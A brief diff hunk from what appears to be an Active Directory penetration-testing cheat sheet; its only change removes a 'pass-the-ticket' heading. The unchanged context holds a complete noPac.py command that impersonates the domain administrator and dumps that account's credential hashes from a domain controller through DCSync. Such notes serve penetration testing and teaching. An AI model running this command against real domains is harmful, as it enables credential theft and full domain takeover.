@@ -129,7 +129,6 @@ Using noPac to DCSync the Built-in Administrator Account
     sudo python3 noPac.py <domain_name>/<domain_username>:<domain_user_password> -dc-ip <domain_controller_ip>  -dc-host <domain_controller_host_name> --impersonate administrator -use-ldap -dump -just-dc-user <domain_name>/administrator
 
 
-## pass-the-ticket
 
 
 
